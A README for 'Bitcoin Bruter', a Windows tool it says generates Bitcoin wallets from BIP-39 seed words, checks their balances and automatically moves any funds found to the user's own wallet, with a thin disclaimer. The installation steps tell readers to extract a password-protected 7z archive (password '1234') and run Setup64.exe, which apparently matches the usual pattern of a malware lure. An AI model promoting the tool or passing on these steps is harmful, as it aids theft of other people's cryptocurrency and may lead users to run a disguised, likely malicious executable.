![Alt text](btc.jpg)




# Bitcoin Bruter  

Bitcoin Bruter is a powerful tool designed to quickly generate Bitcoin wallets from a known set of **BIP-39** words, check their balances, and transfer any discovered BTC to your own wallet. This tool supports querying the Bitcoin blockchain via APIs or a local **Bitcoin Core daemon (`bitcoind`)**.

The tool comes packaged as an executable (`Setup64.exe`) inside a **7z** archive, offering a portable and easy-to-use solution. Simply extract the archive, run the executable, and start testing.

> **Disclaimer**: Unauthorized access to Bitcoin wallets that are not yours is illegal and unethical. This tool is meant for legitimate testing, recovery, and research purposes. Use it responsibly.

---

## Features  

- Generate Bitcoin wallets from partial or full **BIP-39 seed phrases**.  
- Check wallet balances using:  
  - Blockchain APIs (e.g., Blockchain.com, Blockchair, etc.)  
  - Local **Bitcoin Core daemon (`bitcoind`)** for maximum privacy and security.  
- Automatically transfer any discovered funds to a secure destination wallet.  
- Optimized for fast execution and simplicity.  
- Works directly with `bitcoind` to speed up wallet balance checks and transactions, bypassing external API limits.

---

## Installation  

### Prerequisites  

- **Windows operating system** (the tool is packaged as an `.exe` file).  
- **Bitcoin Core** (installed and running `bitcoind` as a local daemon for blockchain queries).  
- A **7-Zip** compatible extractor for the archive (if not already installed).  

### Steps  

1. Download the **Bitcoin Bruter 7z archive** from the repository.  
2. Extract the archive using a tool like [7-Zip](https://www.7-zip.org/).  
   - The password for the archive is: `1234`.  

3. Inside the extracted folder, you'll find an executable file:  
   ```bash  
   Setup64.exe

4. Run the executable directly. No installation required. The tool will automatically generate wallets from a random combination of the known BIP-39 seed words.
